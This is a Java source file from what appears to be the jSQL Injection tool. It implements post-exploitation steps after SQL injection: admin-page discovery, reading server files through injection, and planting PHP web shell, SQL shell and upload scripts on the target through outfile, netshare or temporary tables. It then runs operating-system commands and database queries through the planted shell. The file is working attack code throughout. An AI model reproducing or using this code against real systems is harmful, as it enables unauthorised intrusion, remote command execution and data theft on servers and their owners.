/*******************************************************************************
 * Copyhacked (H) 2012-2025.
 * This program and the accompanying materials
 * are made available under no term at all, use it like
 * you want, but share and discuss it
 * every time possible with every body.
 * 
 * Contributors:
 *      ron190 at ymail dot com - initial implementation
 ******************************************************************************/
package com.jsql.model.accessible;

import com.jsql.model.InjectionModel;
import com.jsql.model.bean.database.MockElement;
import com.jsql.model.bean.util.Header;
import com.jsql.model.bean.util.Interaction;
import com.jsql.model.bean.util.Request;
import com.jsql.model.exception.JSqlException;
import com.jsql.model.exception.JSqlRuntimeException;
import com.jsql.model.suspendable.SuspendableGetRows;
import com.jsql.util.ConnectionUtil;
import com.jsql.util.LogLevelUtil;
import com.jsql.util.StringUtil;
import org.apache.commons.lang3.RandomStringUtils;
import org.apache.commons.lang3.StringUtils;
import org.apache.logging.log4j.LogManager;
import org.apache.logging.log4j.Logger;

import java.io.File;
import java.io.FileInputStream;
import java.io.IOException;
import java.io.InputStream;
import java.net.URI;
import java.net.URLEncoder;
import java.net.http.HttpHeaders;
import java.net.http.HttpRequest;
import java.net.http.HttpRequest.BodyPublishers;
import java.net.http.HttpResponse;
import java.net.http.HttpResponse.BodyHandlers;
import java.nio.charset.StandardCharsets;
import java.nio.file.Files;
import java.nio.file.Path;
import java.nio.file.Paths;
import java.time.Duration;
import java.util.*;
import java.util.concurrent.CompletionService;
import java.util.concurrent.ExecutionException;
import java.util.concurrent.ExecutorCompletionService;
import java.util.concurrent.ExecutorService;
import java.util.function.BiPredicate;
import java.util.function.BinaryOperator;
import java.util.regex.Pattern;

/**
 * Resource access object.
 * Get information from file system, commands, webpage.
 */
public class ResourceAccess {
    
    /**
     * Log4j logger sent to view.
     */
    private static final Logger LOGGER = LogManager.getRootLogger();

    /**
     * True if admin page should stop, false otherwise.
     */
    private boolean isSearchAdminStopped = false;
    
    /**
     * True if scan list should stop, false otherwise.
     */
    private boolean isScanStopped = false;

    /**
     * True if ongoing file reading must stop, false otherwise.
     * If true any new file read is cancelled at start.
     */
    private boolean isSearchFileStopped = false;

    /**
     * List of ongoing jobs.
     */
    private final List<CallableFile> callablesReadFile = new ArrayList<>();
    private final InjectionModel injectionModel;
    public static final String SQL_DOT_PHP = "sql.php";

    public ResourceAccess(InjectionModel injectionModel) {
        this.injectionModel = injectionModel;
    }

    /**
     * Check if every page in the list responds 200 Success.
     * @param pageNames    List of admin pages to test
     */
    public int createAdminPages(String urlInjection, List<String> pageNames) {
        var matcher = Pattern.compile("^((https?://)?[^/]*)(.*)").matcher(urlInjection);
        matcher.find();
        String urlProtocol = matcher.group(1);
        String urlWithoutProtocol = matcher.group(3);

        List<String> folderSplits = new ArrayList<>();

        // Hostname only
        if (urlWithoutProtocol.isEmpty() || !Pattern.matches("^/.*", urlWithoutProtocol)) {
            urlWithoutProtocol = "/dummy";
        }
        String[] splits = urlWithoutProtocol.split("/", -1);
        String[] folderNames = Arrays.copyOf(splits, splits.length - 1);
        for (String folderName: folderNames) {
            folderSplits.add(folderName +"/");
        }

        ExecutorService taskExecutor = this.injectionModel.getMediatorUtils().getThreadUtil().getExecutor("CallableGetAdminPage");
        CompletionService<CallableHttpHead> taskCompletionService = new ExecutorCompletionService<>(taskExecutor);

        var urlPart = new StringBuilder();
        for (String segment: folderSplits) {
            urlPart.append(segment);
            for (String pageName: pageNames) {
                taskCompletionService.submit(
                    new CallableHttpHead(
                        urlProtocol + urlPart + pageName,
                        this.injectionModel,
                        "check:page"
                    )
                );
            }
        }

        var nbAdminPagesFound = 0;
        int submittedTasks = folderSplits.size() * pageNames.size();
        int tasksHandled;
        for (
            tasksHandled = 0
            ; tasksHandled < submittedTasks && !this.isSearchAdminStopped()
            ; tasksHandled++
        ) {
            nbAdminPagesFound = this.callAdminPage(taskCompletionService, nbAdminPagesFound);
        }

        this.injectionModel.getMediatorUtils().getThreadUtil().shutdown(taskExecutor);
        this.isSearchAdminStopped = false;
        this.logSearchAdminPage(nbAdminPagesFound, submittedTasks, tasksHandled);

        return nbAdminPagesFound;
    }

    public int callAdminPage(CompletionService<CallableHttpHead> taskCompletionService, int nbAdminPagesFound) {
        int nbAdminPagesFoundFixed = nbAdminPagesFound;
        
        try {
            CallableHttpHead currentCallable = taskCompletionService.take().get();
            if (currentCallable.isHttpResponseOk()) {
                var request = new Request();
                request.setMessage(Interaction.CREATE_ADMIN_PAGE_TAB);
                request.setParameters(currentCallable.getUrl());
                this.injectionModel.sendToViews(request);

                nbAdminPagesFoundFixed++;
                LOGGER.log(LogLevelUtil.CONSOLE_SUCCESS, "Found page: {}", currentCallable.getUrl());
            }
        } catch (InterruptedException e) {
            LOGGER.log(LogLevelUtil.IGNORE, e, e);
            Thread.currentThread().interrupt();
        } catch (ExecutionException e) {
            LOGGER.log(LogLevelUtil.CONSOLE_JAVA, e, e);
        }
        return nbAdminPagesFoundFixed;
    }

    public void logSearchAdminPage(int nbAdminPagesFound, int submittedTasks, int tasksHandled) {
        var result = String.format(
            "Searched %s/%s page%s: %s found",
            tasksHandled,
            submittedTasks,
            tasksHandled > 1 ? 's' : StringUtils.EMPTY,
            nbAdminPagesFound
        );
        
        if (nbAdminPagesFound > 0) {
            LOGGER.log(LogLevelUtil.CONSOLE_SUCCESS, result);
        } else {
            LOGGER.log(LogLevelUtil.CONSOLE_ERROR, result);
        }
    }

    public String createExploitWeb(String pathExploit, String urlExploit, String pathNetshare, ExploitMethod exploitMethod) throws JSqlException {
        BinaryOperator<String> biFuncGetRequest = (String pathExploitFixed, String urlSuccess) -> {
            var request = new Request();
            request.setMessage(Interaction.ADD_TAB_EXPLOIT_WEB);
            request.setParameters(urlSuccess);
            this.injectionModel.sendToViews(request);
            return urlSuccess;
        };
        return this.createExploit(pathExploit, urlExploit, "exploit.web", "web.php", biFuncGetRequest, pathNetshare, exploitMethod);
    }

    public void createExploitUpload(String pathExploit, String urlExploit, String pathNetshare, ExploitMethod exploitMethod, File fileToUpload) throws JSqlException {
        BinaryOperator<String> biFuncGetRequest = (String pathExploitFixed, String urlSuccess) -> {
            try (InputStream streamToUpload = new FileInputStream(fileToUpload)) {
                HttpResponse<String> result = this.upload(fileToUpload, urlSuccess, streamToUpload);
                if (result.body().contains(DataAccess.LEAD + "y")) {
                    LOGGER.log(LogLevelUtil.CONSOLE_SUCCESS, "Upload successful: ack received for {}{}", pathExploit, fileToUpload.getName());
                } else {
                    LOGGER.log(LogLevelUtil.CONSOLE_ERROR, "Upload failure: missing ack for {}{}", pathExploit, fileToUpload.getName());
                }
            } catch (InterruptedException e) {
                LOGGER.log(LogLevelUtil.IGNORE, e, e);
                Thread.currentThread().interrupt();
            } catch (IOException | JSqlException e) {
                throw new JSqlRuntimeException(e);
            }
            return urlSuccess;
        };
        this.createExploit(pathExploit, urlExploit, "exploit.upl", "upl.php", biFuncGetRequest, pathNetshare, exploitMethod);
    }

    public String createExploitSql(String pathExploit, String urlExploit, String pathNetshare, ExploitMethod exploitMethod, String username, String password) throws JSqlException {
        BinaryOperator<String> biFuncGetRequest = (String pathExploitFixed, String urlSuccess) -> {
            var resultQuery = this.runSqlShell("select 1337", null, urlSuccess, username, password, false);
            if (resultQuery != null && resultQuery.contains("| 1337 |")) {
                var request = new Request();
                request.setMessage(Interaction.ADD_TAB_EXPLOIT_SQL);
                request.setParameters(urlSuccess, username, password);
                this.injectionModel.sendToViews(request);
                return urlSuccess;
            }
            return StringUtils.EMPTY;
        };
        var urlSuccess = this.createExploit(pathExploit, urlExploit, "exploit.sql.mysqli", ResourceAccess.SQL_DOT_PHP, biFuncGetRequest, pathNetshare, exploitMethod);
        if (StringUtils.isEmpty(urlSuccess)) {
            LOGGER.log(LogLevelUtil.CONSOLE_ERROR, "Failure with mysqli_query(), trying with pdo()...");
            urlSuccess = this.createExploit(pathExploit, urlExploit, "exploit.sql.pdo", ResourceAccess.SQL_DOT_PHP, biFuncGetRequest, pathNetshare, exploitMethod);
        }
        if (StringUtils.isEmpty(urlSuccess)) {
            LOGGER.log(LogLevelUtil.CONSOLE_ERROR, "Failure with pdo(), trying with mysql_query()...");
            urlSuccess = this.createExploit(pathExploit, urlExploit, "exploit.sql.mysql", ResourceAccess.SQL_DOT_PHP, biFuncGetRequest, pathNetshare, exploitMethod);
        }
        if (StringUtils.isEmpty(urlSuccess)) {
            LOGGER.log(LogLevelUtil.CONSOLE_ERROR, "No connection to the database");
        }
        return urlSuccess;
    }

    /**
     * Create shell on remote server
     * @param urlExploit  URL for the script (used for url rewriting)
     */
    public String createExploit(
        String pathRemoteFolder,
        String urlExploit,
        String keyPropertyExploit,
        String nameExploit,
        BinaryOperator<String> biFuncGetRequest,
        String pathNetshareFolder,
        ExploitMethod exploitMethod
    ) throws JSqlException {
        if (this.isReadingNotAllowed()) {
            return null;
        }

        String bodyExploit = StringUtil.base64Decode(
            this.injectionModel.getMediatorUtils().getPropertiesUtil().getProperties().getProperty(keyPropertyExploit)
        )
        .replace(DataAccess.SHELL_LEAD, DataAccess.LEAD)
        .replace(DataAccess.SHELL_TRAIL, DataAccess.TRAIL);

        // outfile + binary: content corruption
        BiPredicate<String, String> biPredConfirm = (String pathFolder, String nameFile) -> {
            try {
                String resultInjection = this.confirmExploit(pathFolder + nameFile);
                return resultInjection.contains(bodyExploit);
            } catch (JSqlException e) {
                throw new JSqlRuntimeException(e);
            }
        };

        var nbIndexesFound = this.injectionModel.getMediatorStrategy().getSpecificUnion().getNbIndexesFound() - 1;
        String nameExploitValidated = StringUtils.EMPTY;

        if (exploitMethod == ExploitMethod.NETSHARE) {
            ResourceAccess.copyToShare(pathNetshareFolder + nameExploit, bodyExploit);
            nameExploitValidated = this.injectionModel.getUdfAccess().byNetshare(
                nbIndexesFound,
                pathNetshareFolder,
                nameExploit,
                pathRemoteFolder,
                biPredConfirm
            );
        } else if (exploitMethod == ExploitMethod.AUTO || exploitMethod == ExploitMethod.QUERY_BODY) {
            nameExploitValidated = this.injectionModel.getUdfAccess().byQueryBody(
                nbIndexesFound,
                pathRemoteFolder,
                nameExploit,
                StringUtil.toHexChunks(bodyExploit.getBytes()),
                biPredConfirm
            );
        }
        if (StringUtils.isEmpty(nameExploitValidated) && exploitMethod == ExploitMethod.AUTO || exploitMethod == ExploitMethod.TEMP_TABLE) {
            var nameExploitRandom = RandomStringUtils.secure().nextAlphabetic(8) +"-"+ nameExploit;
            this.injectionModel.getUdfAccess().byTable(
                StringUtil.toHexChunks(bodyExploit.getBytes()),
                pathRemoteFolder + nameExploitRandom
            );
            if (biPredConfirm.test(pathRemoteFolder, nameExploitRandom)) {
                nameExploitValidated = nameExploitRandom;
            }
        }

        if (StringUtils.isEmpty(nameExploitValidated)) {
            LOGGER.log(LogLevelUtil.CONSOLE_ERROR, "Exploit creation failure: source file not found at [{}{}]", pathRemoteFolder, nameExploitValidated);
            return null;
        }
        nameExploit = nameExploitValidated;
        LOGGER.log(LogLevelUtil.CONSOLE_SUCCESS, "Exploit creation successful: source file found at [{}{}]", pathRemoteFolder, nameExploitValidated);

        return this.checkUrls(urlExploit, nameExploit, biFuncGetRequest);
    }

    private String checkUrls(String urlExploit, String nameExploit, BinaryOperator<String> biFuncGetRequest) {
        String urlExploitFixed = urlExploit;
        if (!urlExploitFixed.isEmpty()) {
            urlExploitFixed = urlExploitFixed.replaceAll("/*$", StringUtils.EMPTY) +"/";
        }
        String url = urlExploitFixed;
        if (StringUtils.isEmpty(url)) {
            url = this.injectionModel.getMediatorUtils().getConnectionUtil().getUrlBase();
        }
        String urlWithoutProtocol = url.replaceAll("^https?://[^/]*", StringUtils.EMPTY);
        String urlProtocol;
        if ("/".equals(urlWithoutProtocol)) {
            urlProtocol = url.replaceAll("/+$", StringUtils.EMPTY);
        } else {
            urlProtocol = url.replace(urlWithoutProtocol, StringUtils.EMPTY);
        }

        List<String> directoryNames = new ArrayList<>();
        String urlWithoutFileName = urlWithoutProtocol.replaceAll("[^/]*$", StringUtils.EMPTY).replaceAll("/+", "/");
        if (urlWithoutFileName.split("/").length == 0) {
            directoryNames.add("/");
        }
        for (String directoryName: urlWithoutFileName.split("/")) {
            directoryNames.add(directoryName +"/");
        }
        String urlSuccess = this.getExploitUrl(nameExploit, directoryNames, urlProtocol);
        if (urlSuccess != null) {
            urlSuccess = biFuncGetRequest.apply(nameExploit, urlSuccess);
        } else {
            LOGGER.log(LogLevelUtil.CONSOLE_ERROR, "Exploit access failure: URL not found");
        }
        return urlSuccess;
    }

    private static void copyToShare(String pathFile, String bodyExploit) throws JSqlException {
        Path path = Paths.get(pathFile);
        try {
            Files.write(path, bodyExploit.getBytes());
        } catch (IOException e) {
            throw new JSqlException(e);
        }
    }

    private String confirmExploit(String path) throws JSqlException {
        var sourcePage = new String[]{ StringUtils.EMPTY };
        return new SuspendableGetRows(this.injectionModel).run(
            this.injectionModel.getMediatorVendor().getVendor().instance().sqlFileRead(path),
            sourcePage,
            false,
            1,
            MockElement.MOCK,
            "xpl#confirm-file"
        );
    }

    private String getExploitUrl(String filename, List<String> directoryNames, String urlProtocol) {
        ExecutorService taskExecutor = this.injectionModel.getMediatorUtils().getThreadUtil().getExecutor("CallableGetExploitUrl");
        CompletionService<CallableHttpHead> taskCompletionService = new ExecutorCompletionService<>(taskExecutor);
        var urlPart = new StringBuilder();

        for (String segment: directoryNames) {
            urlPart.append(segment);
            taskCompletionService.submit(
                new CallableHttpHead(
                    urlProtocol + urlPart + filename,
                    this.injectionModel,
                    "xpl#confirm-url"
                )
            );
        }

        String urlSuccess = null;
        int submittedTasks = directoryNames.size();
        for (var tasksHandled = 0 ; tasksHandled < submittedTasks ; tasksHandled++) {
            try {
                CallableHttpHead currentCallable = taskCompletionService.take().get();
                if (currentCallable.isHttpResponseOk()) {
                    urlSuccess = currentCallable.getUrl();
                    LOGGER.log(LogLevelUtil.CONSOLE_SUCCESS, "Exploit access successful: connection done at [{}]", currentCallable.getUrl());
                    break;
                } else {
                    LOGGER.log(LogLevelUtil.CONSOLE_DEFAULT, "Exploit access failure: connection not found at [{}]", currentCallable.getUrl());
                }
            } catch (InterruptedException e) {
                LOGGER.log(LogLevelUtil.IGNORE, e, e);
                Thread.currentThread().interrupt();
            } catch (ExecutionException e) {
                LOGGER.log(LogLevelUtil.CONSOLE_JAVA, e, e);
            }
        }

        this.injectionModel.getMediatorUtils().getThreadUtil().shutdown(taskExecutor);
        return urlSuccess;
    }

    public String runCommandShell(String urlCommand) {
        String pageSource;
        try {
            pageSource = this.injectionModel.getMediatorUtils().getConnectionUtil().getSource(urlCommand);
        } catch (Exception e) {
            pageSource = StringUtils.EMPTY;
        }
        
        var regexSearch = Pattern.compile("(?s)<"+ DataAccess.LEAD +">(.*)<"+ DataAccess.TRAIL +">").matcher(pageSource);
        regexSearch.find();

        String result;
        // IllegalStateException #1544: catch incorrect execution
        try {
            result = regexSearch.group(1);
        } catch (IllegalStateException e) {
            result = StringUtils.EMPTY;  // fix return null from regex
            LOGGER.log(LogLevelUtil.CONSOLE_ERROR, "Command failure: incorrect response from shell");
        }
        return result;
    }
    
    /**
     * Run a shell command on host.
     * @param command The command to execute
     * @param uuidShell An unique identifier for terminal
     * @param urlExploit Web path of the shell
     */
    public String runWebShell(String command, UUID uuidShell, String urlExploit) {
        String result = this.runCommandShell(
            urlExploit + "?c="+ URLEncoder.encode(command.trim(), StandardCharsets.ISO_8859_1)
        );
        if (StringUtils.isBlank(result)) {
            // TODO Payload should redirect directly error to default output
            result = "No result.\nTry '"+ command.trim() +" 2>&1' to get a system error message.\n";
        }

        var request = new Request();  // Unfroze interface
        request.setMessage(Interaction.GET_EXPLOIT_WEB_RESULT);
        request.setParameters(uuidShell, result);
        this.injectionModel.sendToViews(request);
        return result;
    }

    /**
     * Execute SQL request into terminal defined by URL path, eventually override with database user/pass identifiers.
     * @param command SQL request to execute
     * @param uuidShell Identifier of terminal sending the request
     * @param urlExploit URL to send SQL request against
     * @param username Username [optional]
     * @param password password [optional]
     */
    public String runSqlShell(String command, UUID uuidShell, String urlExploit, String username, String password) {
        return this.runSqlShell(command, uuidShell, urlExploit, username, password, true);
    }

    public String runSqlShell(String command, UUID uuidShell, String urlExploit, String username, String password, boolean isWithView) {
        String result = this.runCommandShell(String.format(
             "%s?q=%s&u=%s&p=%s",
             urlExploit,
             URLEncoder.encode(command.trim(), StandardCharsets.ISO_8859_1),
             username,
             password
        ));
            
        if (result.contains("<SQLr>")) {
            List<List<String>> listRows = this.parse(result);
            if (listRows.isEmpty()) {
                result = "Result not found: check your credentials or review logs in tab Network\n";
            } else {
                List<Integer> listFieldsLength = this.parseColumnLength(listRows);
                result = this.convert(listRows, listFieldsLength);
            }
        } else if (result.contains("<SQLm>")) {  // todo deprecated
            result = result.replace("<SQLm>", StringUtils.EMPTY) + "\n";
        } else if (result.contains("<SQLe>")) {  // todo deprecated
            result = result.replace("<SQLe>", StringUtils.EMPTY) + "\n";
        }

        if (isWithView) {
            var request = new Request();  // Unfroze interface
            request.setMessage(Interaction.GET_EXPLOIT_SQL_RESULT);
            request.setParameters(uuidShell, result, command);
            this.injectionModel.sendToViews(request);
        }
        return result;
    }

    private String convert(List<List<String>> listRows, List<Integer> listFieldsLength) {
        var tableText = new StringBuilder("+");
        for (Integer fieldLength: listFieldsLength) {
            tableText.append("-").append(StringUtils.repeat("-", fieldLength)).append("-+");
        }
        tableText.append("\n");
        for (List<String> listFields: listRows) {
            tableText.append("|");
            var cursorPosition = 0;
            for (String field: listFields) {
                tableText.append(StringUtils.SPACE)
                    .append(field)
                    .append(StringUtils.repeat(StringUtils.SPACE, listFieldsLength.get(cursorPosition) - field.length()))
                    .append(" |");
                cursorPosition++;
            }
            tableText.append("\n");
        }
        tableText.append("+");
        for (Integer fieldLength: listFieldsLength) {
            tableText.append("-").append(StringUtils.repeat("-", fieldLength)).append("-+");
        }
        tableText.append("\n");
        return tableText.toString();
    }

    private List<Integer> parseColumnLength(List<List<String>> listRows) {
        List<Integer> listFieldsLength = new ArrayList<>();
        for (
            var indexLongestRowSearch = 0;
            indexLongestRowSearch < listRows.get(0).size();
            indexLongestRowSearch++
        ) {
            int indexLongestRowSearchFinal = indexLongestRowSearch;
            listRows.sort(
                (firstRow, secondRow) -> secondRow.get(indexLongestRowSearchFinal).length() - firstRow.get(indexLongestRowSearchFinal).length()
            );
            listFieldsLength.add(listRows.get(0).get(indexLongestRowSearch).length());
        }
        return listFieldsLength;
    }

    private List<List<String>> parse(String result) {
        List<List<String>> listRows = new ArrayList<>();
        var rowsMatcher = Pattern.compile("(?si)<tr>(<td>.*?</td>)</tr>").matcher(result);
        while (rowsMatcher.find()) {
            String values = rowsMatcher.group(1);
            var fieldsMatcher = Pattern.compile("(?si)<td>(.*?)</td>").matcher(values);
            List<String> listFields = new ArrayList<>();
            listRows.add(listFields);
            
            while (fieldsMatcher.find()) {
                String field = fieldsMatcher.group(1);
                listFields.add(field);
            }
        }
        return listRows;
    }

    private HttpResponse<String> upload(File file, String url, InputStream streamToUpload) throws IOException, JSqlException, InterruptedException {
        var crLf = "\r\n";
        var boundary = "---------------------------4664151417711";
        
        var streamData = new byte[streamToUpload.available()];
        if (streamToUpload.read(streamData) == -1) {
            throw new JSqlException("Error reading the file");
        }
        
        String headerForm = StringUtils.EMPTY;
        headerForm += "--"+ boundary + crLf;
        headerForm += "Content-Disposition: form-data; name=\"u\"; filename=\""+ file.getName() +"\""+ crLf;
        headerForm += "Content-Type: binary/octet-stream"+ crLf;
        headerForm += crLf;

        String headerFile = StringUtils.EMPTY;
        headerFile += crLf +"--"+ boundary +"--"+ crLf;

        var httpRequest = HttpRequest.newBuilder()
            .uri(URI.create(url))
            .timeout(Duration.ofSeconds(15))
            .POST(BodyPublishers.ofByteArrays(
                Arrays.asList(
                    headerForm.getBytes(StandardCharsets.UTF_8),
                    Files.readAllBytes(Paths.get(file.toURI())),
                    headerFile.getBytes(StandardCharsets.UTF_8)
                )
            ))
            .setHeader("Content-Type", "multipart/form-data; boundary=" + boundary)
            .build();

        var response = this.injectionModel.getMediatorUtils().getConnectionUtil().getHttpClient().build().send(httpRequest, BodyHandlers.ofString());
        HttpHeaders httpHeaders = response.headers();
        String pageSource = response.body();

        Map<Header, Object> msgHeader = new EnumMap<>(Header.class);
        msgHeader.put(Header.URL, url);
        msgHeader.put(Header.HEADER, ConnectionUtil.getHeadersMap(httpRequest.headers()));
        msgHeader.put(Header.RESPONSE, ConnectionUtil.getHeadersMap(httpHeaders));
        msgHeader.put(Header.SOURCE, pageSource);
        msgHeader.put(Header.METADATA_PROCESS, "upl#multipart");
        var request = new Request();
        request.setMessage(Interaction.MESSAGE_HEADER);
        request.setParameters(msgHeader);
        this.injectionModel.sendToViews(request);
        return response;
    }
    
    /**
     * Check if current user can read files.
     * @return True if user can read file, false otherwise
     * @throws JSqlException when an error occurs during injection
     */
    public boolean isReadingNotAllowed() throws JSqlException {
        // Unsupported Reading file when <file> is not present in current xmlModel
        // Fix #41055: NullPointerException on getFile()
        if (this.injectionModel.getMediatorVendor().getVendor().instance().getModelYaml().getResource().getFile() == null) {
            LOGGER.log(
                LogLevelUtil.CONSOLE_ERROR,
                "Reading file on {} is currently not supported",
                () -> this.injectionModel.getMediatorVendor().getVendor()
            );
            return true;
        }
        
        var sourcePage = new String[]{ StringUtils.EMPTY };
        String resultInjection = new SuspendableGetRows(this.injectionModel).run(
            this.injectionModel.getMediatorVendor().getVendor().instance().sqlPrivilegeTest(),
            sourcePage,
            false,
            1,
            MockElement.MOCK,
            "privilege"
        );

        boolean readingIsAllowed = false;

        if (StringUtils.isEmpty(resultInjection)) {
            this.injectionModel.sendResponseFromSite("Can't read privilege", sourcePage[0].trim());
            var request = new Request();
            request.setMessage(Interaction.MARK_FILE_SYSTEM_INVULNERABLE);
            this.injectionModel.sendToViews(request);
        } else if ("false".equals(resultInjection)) {
            LOGGER.log(LogLevelUtil.CONSOLE_ERROR, "Privilege FILE not granted: files not readable by current user");
            var request = new Request();
            request.setMessage(Interaction.MARK_FILE_SYSTEM_INVULNERABLE);
            this.injectionModel.sendToViews(request);
        } else {
            var request = new Request();
            request.setMessage(Interaction.MARK_FILE_SYSTEM_VULNERABLE);
            this.injectionModel.sendToViews(request);
            readingIsAllowed = true;
        }
        
        return !readingIsAllowed;
    }

    /**
     * Attempt to read files in parallel by their path from the website using injection.
     * Reading file needs a FILE right on the server.
     * The user can interrupt the process at any time.
     * @param pathsFiles List of file paths to read
     * @throws JSqlException when an error occurs during injection
     * @throws InterruptedException if the current thread was interrupted while waiting
     * @throws ExecutionException if the computation threw an exception
     */
    public List<String> readFile(List<String> pathsFiles) throws JSqlException, InterruptedException, ExecutionException {
        if (
            this.injectionModel.getMediatorVendor().getVendor() == this.injectionModel.getMediatorVendor().getMysql()
            && this.isReadingNotAllowed()
        ) {
            return Collections.emptyList();
        }

        var countFileFound = 0;
        var results = new ArrayList<String>();

        ExecutorService taskExecutor = this.injectionModel.getMediatorUtils().getThreadUtil().getExecutor("CallableReadFile");
        CompletionService<CallableFile> taskCompletionService = new ExecutorCompletionService<>(taskExecutor);

        for (String pathFile: pathsFiles) {
            var callableFile = new CallableFile(pathFile, this.injectionModel);
            taskCompletionService.submit(callableFile);
            this.callablesReadFile.add(callableFile);
        }

        List<String> duplicate = new ArrayList<>();
        int submittedTasks = pathsFiles.size();
        int tasksHandled;

        for (
            tasksHandled = 0
            ; tasksHandled < submittedTasks && !this.isSearchFileStopped
            ; tasksHandled++
        ) {
            var currentCallable = taskCompletionService.take().get();
            if (StringUtils.isNotEmpty(currentCallable.getSourceFile())) {
                var name = currentCallable.getPathFile().substring(
                    currentCallable.getPathFile().lastIndexOf('/') + 1
                );
                String content = currentCallable.getSourceFile();
                String path = currentCallable.getPathFile();

                var request = new Request();
                request.setMessage(Interaction.CREATE_FILE_TAB);
                request.setParameters(name, content, path);
                this.injectionModel.sendToViews(request);

                if (!duplicate.contains(path.replace(name, StringUtils.EMPTY))) {
                    LOGGER.log(
                        LogLevelUtil.CONSOLE_INFORM,
                        "Folder candidate to exploit: {}",
                        () -> path.replace(name, StringUtils.EMPTY)
                    );
                }

                duplicate.add(path.replace(name, StringUtils.EMPTY));
                results.add(content);

                countFileFound++;
            }
        }

        // Force ongoing suspendables to stop immediately
        for (CallableFile callableReadFile: this.callablesReadFile) {
            callableReadFile.getSuspendableReadFile().stop();
        }
        this.callablesReadFile.clear();
        this.injectionModel.getMediatorUtils().getThreadUtil().shutdown(taskExecutor);
        this.isSearchFileStopped = false;

        var result = String.format(
            "Searched %s/%s file%s: %s found",
            tasksHandled,
            submittedTasks,
            tasksHandled > 1 ? 's' : StringUtils.EMPTY,
            countFileFound
        );

        if (countFileFound > 0) {
            LOGGER.log(LogLevelUtil.CONSOLE_SUCCESS, result);
        } else {
            LOGGER.log(LogLevelUtil.CONSOLE_ERROR, result);
        }
        return results;
    }
    
    /**
     * Mark the search of files to stop.
     * Any ongoing file reading is interrupted and any new file read
     * is cancelled.
     */
    public void stopSearchFile() {
        this.isSearchFileStopped = true;
        for (CallableFile callable: this.callablesReadFile) {
            callable.getSuspendableReadFile().stop();  // force ongoing business to stop immediately
        }
    }

    public void stopSearchAdmin() {
        this.isSearchAdminStopped = true;
    }


    // Getters and setters
    
    public boolean isSearchAdminStopped() {
        return this.isSearchAdminStopped;
    }
    
    public void setScanStopped(boolean isScanStopped) {
        this.isScanStopped = isScanStopped;
    }

    public boolean isScanStopped() {
        return this.isScanStopped;
    }
}
